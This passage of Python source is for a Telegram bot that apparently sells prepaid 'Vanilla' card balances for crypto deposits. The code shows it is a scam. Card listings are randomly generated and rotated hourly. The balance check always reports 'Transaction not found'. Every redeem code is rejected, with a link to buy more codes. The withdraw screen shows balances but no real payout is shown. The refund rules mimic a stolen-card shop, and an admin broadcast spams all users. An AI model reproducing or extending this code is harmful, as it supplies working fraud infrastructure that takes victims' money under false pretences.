        3600,
        data={"chat_id": sent.chat_id, "message_id": sent.message_id},
    )

    return ConversationHandler.END


async def _delete_deposit_msg(context: ContextTypes.DEFAULT_TYPE):
    d = context.job.data
    try:
        await context.bot.delete_message(chat_id=d["chat_id"], message_id=d["message_id"])
    except Exception:
        pass


async def check_balance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await context.bot.send_message(
        chat_id=query.message.chat_id,
        text="Checking your transaction. Please wait a moment... ⏳"
    )
    await asyncio.sleep(2)
    await context.bot.send_message(
        chat_id=query.message.chat_id,
        text="Transaction not found. Please complete your deposit and click the ♻️ Check Balance button again to update your status."
    )


async def cancel_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        await update.callback_query.edit_message_text("Deposit cancelled.")
    return ConversationHandler.END


async def cents_listing(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_updating:
        await update.message.reply_text("The bot is currently updating, please wait ⚠️")
        return
    user_id = update.effective_user.id
    if user_id not in user_data:
        user_data[user_id] = UserData(user_id, update.effective_user.username or str(user_id))
    # Show cards under $1.00 by applying a temporary filter
    current_filter[user_id] = "__cents__"
    current_page[user_id] = 1
    await show_listing(update, context, user_id, 1)


async def refund_rules(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_updating:
        await update.message.reply_text("The bot is currently updating, please wait ⚠️")
        return
    text = (
        "📋 Refund Rules\n\n"
        "⚠️ IMPORTANT TERMS & CONDITIONS - PLEASE READ BEFORE BUYING:\n\n"
        "⏱ Use Instantly: Please use your card immediately after purchase. We will ONLY issue a "
        "refund if the card balance is proven stolen or missing within 15 minutes of purchase.\n\n"
        "🚫 Refund Policy: Strictly NO refunds will be issued simply because you don't know how "
        "to use the card, or if the card becomes invalid after the timeframe.\n\n"
        "🔍 Checking Your Card: If you need to check your card, you MUST use the built-in "
        "'ReCheck Card' button in our bot.\n\n"
        "🛑 WARNING: Do NOT check your card balance using other third-party bots or websites. "
        "Doing so risks immediate invalidation of your card, and we will not be held responsible.\n"
        "Stay tuned and get ready to buy! 🛒💳"
    )
    await update.message.reply_text(text)


async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not user or user.id != ADMIN_ID:
        return
    broadcast_mode["active"] = not broadcast_mode["active"]
    if broadcast_mode["active"]:
        await update.message.reply_text(
            "📢 Broadcast mode ON.\nSend any message (text/photo/video) and it will be sent to all users.\n"
            "Send /admin again to turn broadcast mode OFF."
        )
    else:
        await update.message.reply_text("✅ Broadcast mode OFF.")


class BroadcastModeFilter(filters.MessageFilter):
    def filter(self, message):
        return (
            broadcast_mode["active"]
            and message.from_user is not None
            and message.from_user.id == ADMIN_ID
        )


async def admin_broadcast_send(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message = update.message
    sent, failed = 0, 0
    for uid in list(user_data.keys()):
        try:
            await context.bot.copy_message(
                chat_id=uid, from_chat_id=message.chat_id, message_id=message.message_id
            )
            sent += 1
        except Exception:
            failed += 1
    await message.reply_text(f"✅ Broadcast sent to {sent} user(s). ({failed} failed)")


async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_updating:
        msg = update.message or (update.callback_query and update.callback_query.message)
        if msg:
            await msg.reply_text("The bot is currently updating, please wait ⚠️")
        return
    text = (
        "🎟️REDEEM CODE\n"
        "━━━━━━━━━━━━━━━━━━━━━\n"
        "Please enter your deposit code ✏️\n"
        "Example : balance-key-XXXXXXXXXXXXXXXX"
    )
    if update.callback_query:
        await update.callback_query.message.reply_text(text)
    else:
        await update.message.reply_text(text)


async def redeem_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("🛒BUY CODE", url="https://t.me/Vanillacardex")]]
    await update.message.reply_text(
        "Invalid deposit code. Please try again.",
        reply_markup=InlineKeyboardMarkup(keyboard),
    )


async def ref(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_updating:
        await update.message.reply_text("The bot is currently updating, please wait ⚠️")
        return
    user = update.effective_user
    bot_username = (await context.bot.get_me()).username
    link = f"https://t.me/{bot_username}?start=ref_{user.id}"
    text = (
        f"🎉 REFERRAL PROGRAM\n\n"
        f"Invite friends and earn 5% every deposit each active referral!\n\n"
        f"🔗 Your unique link: {link}\n\n"
        f"📊 Stats\n"
        f"• Total referrals: 0\n"
        f"• Earned: $0.00\n\n"
        f"❗ Rules\n"
        f"- Bonus awarded when referral completes first transaction\n"
        f"- No self-referrals\n"
        f"- Fraudulent referrals will be banned"
    )
    await update.message.reply_text(text)


async def balance_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_updating:
        await update.message.reply_text("The bot is currently updating, please wait ⚠️")
        return
    u = get_user_data(update)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    text = (
        f"👤 {u.username}\n"
        f"―――――――――――――――――――\n"
        f"🆔 ID: {u.user_id}\n\n"
        f"👤 USER: None\n"
        f"💸 USDT Balance : <code>${u.balance:.7f}</code>\n"
        f"💎 TON (GRAM) Balance : <code>0.00000000</code>\n"
        f"🪙 BNB Balance : <code>0.00000000</code>\n"
        f"👥 Referrals: {len(getattr(u, 'referrals', []))}\n"
        f"💵 Bonus: ${getattr(u, 'earned', 0.0):.2f}\n"
        f"📅 DATE : {now}"
    )
    await update.message.reply_text(text, parse_mode="HTML")


async def withdraw_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_updating:
        await update.message.reply_text("The bot is currently updating, please wait ⚠️")
        return
    u = get_user_data(update)
    text = (
        f"<b>Withdraw Systems</b>\n"
        f"Total deposit: <code>${u.balance:.8f}</code>\n"
        f"USDT Balance: <code>${u.balance:.7f}</code>\n"
        f"TON (GRAM) Balance : <code>0.000000</code>\n"
        f"BNB Balance : <code>0.00000000</code>"
    )
    keyboard = [
        [
            InlineKeyboardButton("🚫 Cencel", callback_data="withdraw_cancel"),
            InlineKeyboardButton("💸 Withdraw", callback_data="withdraw_confirm"),
        ]
    ]
    await update.message.reply_text(text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode="HTML")


async def support_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "🆘 *Support*\n\n"
        "Need help?\n\n"
        "Common issues:\n"
        "• lunch bots — use /start\n"
        "• Redeem code — use /redeem\n"
        "• *Deposit*  — use /deposit\n"
        "• Show List — use /listings\n"
        "• Show Balance — use /balance\n"
        "• Balance withdraw  — use /withdraw\n"
        "• Refunds Rules — use /refund\\_rules\n\n"
        "*Contact Support or report an issue*   @Vanila\\_Team"
    )
    await update.message.reply_text(text, parse_mode="MarkdownV2")


async def update_cards_job():
    global is_updating
    is_updating = True
    logger.info("Update started at %s", datetime.now())
    generate_cards()
    await asyncio.sleep(600)
    is_updating = False
    logger.info("Update finished at %s", datetime.now())


def rotate_cards():
    """Replace ~5% of the current listing with freshly generated cards every hour.
    Purchase clicks never remove/out-of-stock a card — only this rotation changes stock."""
    global cards
    if not cards:
        return
    count = max(1, int(len(cards) * 0.05))
    count = min(count, len(cards))
    replace_indices = random.sample(range(len(cards)), count)
    used_numbers = {c.card_number for c in cards}
    fresh_balances = _random_balances(count)
    fresh_cards = _build_cards(fresh_balances, used_numbers=used_numbers)
    for idx, new_card in zip(replace_indices, fresh_cards):
        cards[idx] = new_card
    cards.sort(key=lambda c: c.balance, reverse=True)
    logger.info("Rotated %d cards (5%% hourly refresh)", count)


async def post_init(application: Application):
    scheduler = AsyncIOScheduler()
    scheduler.add_job(update_cards_job, "cron", hour=3, minute=0)
    scheduler.add_job(rotate_cards, "interval", hours=1)
    scheduler.start()
    logger.info("Scheduler started")


_health_app = Flask(__name__)


@_health_app.route("/")
def _health_check():
    return "OK", 200


def _run_health_server():
    """Tiny HTTP server so Uptime Robot can ping to confirm the process is alive.
    Binds to the PORT env var (default 8080) — required for Render Web Services."""
    port = int(os.environ.get("PORT", 8080))
    # Silence Flask's startup banner and access logs.
    import logging as _log
    _log.getLogger("werkzeug").setLevel(_log.ERROR)
    _health_app.run(host="0.0.0.0", port=port)


def main():
    generate_cards()

    # Start health-check server only when PORT is set (i.e. running on Render).
    # On Replit the env var is absent, so we skip it to avoid port conflicts.
    if os.environ.get("PORT"):
        health_thread = threading.Thread(target=_run_health_server, daemon=True)
        health_thread.start()
        logger.info("Health check server started on port %s", os.environ["PORT"])

    application = Application.builder().token(BOT_TOKEN).post_init(post_init).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("listings", listings_command))
    application.add_handler(CommandHandler("cents_listing", cents_listing))
    application.add_handler(CommandHandler("profile", profile))
    application.add_handler(CommandHandler("deposit", deposit_command))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("ref", ref))
    application.add_handler(CommandHandler("refund_rules", refund_rules))
    application.add_handler(CommandHandler("admin", admin_command))
    application.add_handler(CommandHandler("balance", balance_command))
    application.add_handler(CommandHandler("withdraw", withdraw_command))
    application.add_handler(CommandHandler("support", support_command))

    # Runs before every other handler, but only matches when the admin has
    # broadcast mode active — otherwise it falls through to normal handling.
    application.add_handler(MessageHandler(BroadcastModeFilter() & ~filters.COMMAND, admin_broadcast_send), group=-1)

    conv_handler = ConversationHandler(
        entry_points=[CallbackQueryHandler(deposit_amount_handler, pattern="^deposit_(30|50|100|custom)$")],
        states={
            DEPOSIT_AMOUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, deposit_custom_amount)],
            DEPOSIT_CURRENCY: [CallbackQueryHandler(deposit_coin_handler, pattern="^deposit_(coin_(bnb|ton|usdt)|others)$")],
        },
        fallbacks=[
            CallbackQueryHandler(cancel_deposit, pattern="^cancel_deposit$"),
            # If a user got stuck mid-conversation (e.g. invalid custom amount,
            # or navigated away before picking a coin), clicking an amount
            # button again must always restart the deposit flow instead of
            # silently falling through to the generic button handler.
            CallbackQueryHandler(deposit_amount_handler, pattern="^deposit_(30|50|100|custom)$"),
        ],
    )
    application.add_handler(conv_handler)

    application.add_handler(CallbackQueryHandler(button_handler))

    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, redeem_code))

    logger.info("Bot starting...")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
